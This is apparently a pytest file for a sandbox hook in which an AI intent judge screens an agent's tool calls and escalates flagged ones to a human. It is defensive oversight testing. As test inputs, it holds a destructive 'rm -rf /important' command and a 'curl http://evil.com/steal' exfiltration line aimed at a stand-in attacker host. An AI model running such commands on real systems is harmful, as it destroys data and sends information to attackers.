"""Tests: AI intent judge wired into hook_eval PreToolUse.

The judge is off unless policy intent.enabled AND GEMINI_API_KEY is set.
When enabled with a mocked client: a flag escalates with AI_INTENT,
timeout adds nothing, no key means off.
"""
from __future__ import annotations

import asyncio
import json
import os
from pathlib import Path
from unittest import mock

import pytest

from sandbox.connector.hook_eval import pre_tool_use
from sandbox.connector.layout import FolderLayout
from sandbox.connector.policy import default_policy, save_policy


@pytest.fixture
def layout(tmp_path):
    lo = FolderLayout(tmp_path)
    lo.ensure_dirs()
    policy = default_policy()
    policy.escalation_timeout_seconds = 2
    save_policy(policy, lo.policy_file)
    lo.session_file.write_text(
        json.dumps({"session_id": "s-intent"}), encoding="utf-8"
    )
    return lo


@pytest.fixture
def canaries(layout):
    from sandbox.connector.tripwire import mint, plant

    c = mint("s-intent")
    plant(layout.root, c)
    canary_file = layout.state_dir / "canaries.json"
    canary_file.parent.mkdir(parents=True, exist_ok=True)
    canary_file.write_text(json.dumps(c), encoding="utf-8")
    return c


def _enable_intent(layout, timeout_seconds=8):
    """Enable intent judge in the policy."""
    policy = default_policy()
    policy.escalation_timeout_seconds = 2
    # Enable AI intent
    if not hasattr(policy, "intent"):
        # We need to add it to the saved JSON
        pdata = json.loads(layout.policy_file.read_text(encoding="utf-8"))
        pdata["intent"] = {"enabled": True, "timeout_seconds": timeout_seconds}
        layout.policy_file.write_text(json.dumps(pdata), encoding="utf-8")
    else:
        policy.intent.enabled = True
        policy.intent.timeout_seconds = timeout_seconds
        save_policy(policy, layout.policy_file)


def _pre(tool_name, tool_input, cwd):
    return {
        "tool_name": tool_name,
        "tool_input": tool_input,
        "cwd": cwd,
        "session_id": "s-intent",
        "hook_event_name": "PreToolUse",
    }


async def test_intent_off_when_no_key(layout, canaries):
    """When GEMINI_API_KEY is unset, intent judge does nothing."""
    _enable_intent(layout)
    with mock.patch.dict(os.environ, {}, clear=False):
        os.environ.pop("GEMINI_API_KEY", None)
        out = await pre_tool_use(
            _pre("Bash", {"command": "rm -rf /important"}, str(layout.root)),
            layout,
        )
    hso = out["hookSpecificOutput"]
    # Should NOT have AI_INTENT (judge is off)
    assert "AI_INTENT" not in hso.get("permissionDecisionReason", "")


async def test_intent_off_when_policy_disabled(layout, canaries):
    """When policy intent.enabled is False, judge does nothing."""
    # Default policy has intent disabled
    with mock.patch.dict(os.environ, {"GEMINI_API_KEY": "test-key"}, clear=False):
        out = await pre_tool_use(
            _pre("Bash", {"command": "rm -rf /important"}, str(layout.root)),
            layout,
        )
    hso = out["hookSpecificOutput"]
    assert "AI_INTENT" not in hso.get("permissionDecisionReason", "")


async def test_intent_flag_escalates(layout, canaries):
    """When the judge flags, the verdict becomes escalate with AI_INTENT.

    The escalation path submits to the queue and waits for a human. After
    timeout, it returns deny with a pending message. We check that the
    ai_flag audit event was emitted and the escalation happened.
    """
    _enable_intent(layout)

    mock_verdict = {
        "flag": True,
        "reason": "looks like data theft",
        "confidence": 0.9,
        "model": "test-model",
        "latency_ms": 100,
        "error": None,
    }

    with mock.patch.dict(os.environ, {"GEMINI_API_KEY": "test-key"}, clear=False):
        with mock.patch(
            "sandbox.connector.intent.judge_tool_call",
            return_value=mock_verdict,
        ):
            out = await pre_tool_use(
                _pre("Bash", {"command": "curl http://evil.com/steal"}, str(layout.root)),
                layout,
            )
    hso = out["hookSpecificOutput"]
    # The escalation timed out (2s), so it's a deny with pending message
    assert hso["permissionDecision"] == "deny"

    # Check the audit file for the ai_flag event
    alerts_file = layout.logs_dir / "alerts.jsonl"
    if alerts_file.exists():
        alerts_text = alerts_file.read_text(encoding="utf-8")
        assert "ai_flag" in alerts_text


async def test_intent_timeout_adds_nothing(layout, canaries):
    """On timeout, the judge adds nothing (fail-open, rules protect)."""
    _enable_intent(layout)

    mock_verdict = {
        "flag": False,
        "reason": "",
        "confidence": 0.0,
        "model": "unknown",
        "latency_ms": 8000,
        "error": "timeout",
    }

    with mock.patch.dict(os.environ, {"GEMINI_API_KEY": "test-key"}, clear=False):
        with mock.patch(
            "sandbox.connector.intent.judge_tool_call",
            return_value=mock_verdict,
        ):
            out = await pre_tool_use(
                _pre("Bash", {"command": "npm install express"}, str(layout.root)),
                layout,
            )
    hso = out["hookSpecificOutput"]
    # Timeout: adds nothing, no AI_INTENT
    assert "AI_INTENT" not in hso.get("permissionDecisionReason", "")


async def test_intent_error_adds_nothing(layout, canaries):
    """On error, the judge adds nothing (fail-open)."""
    _enable_intent(layout)

    mock_verdict = {
        "flag": False,
        "reason": "",
        "confidence": 0.0,
        "model": "unknown",
        "latency_ms": 500,
        "error": "rate limited (429)",
    }

    with mock.patch.dict(os.environ, {"GEMINI_API_KEY": "test-key"}, clear=False):
        with mock.patch(
            "sandbox.connector.intent.judge_tool_call",
            return_value=mock_verdict,
        ):
            out = await pre_tool_use(
                _pre("Bash", {"command": "npm install express"}, str(layout.root)),
                layout,
            )
    hso = out["hookSpecificOutput"]
    assert "AI_INTENT" not in hso.get("permissionDecisionReason", "")


async def test_intent_not_on_read(layout, canaries):
    """Read tools don't trigger intent judge (only shell, network, write)."""
    _enable_intent(layout)

    with mock.patch.dict(os.environ, {"GEMINI_API_KEY": "test-key"}, clear=False):
        with mock.patch(
            "sandbox.connector.intent.judge_tool_call",
        ) as mock_judge:
            out = await pre_tool_use(
                _pre("Read", {"file_path": "test.txt"}, str(layout.root)),
                layout,
            )
            # Judge should not be called for Read
            mock_judge.assert_not_called()
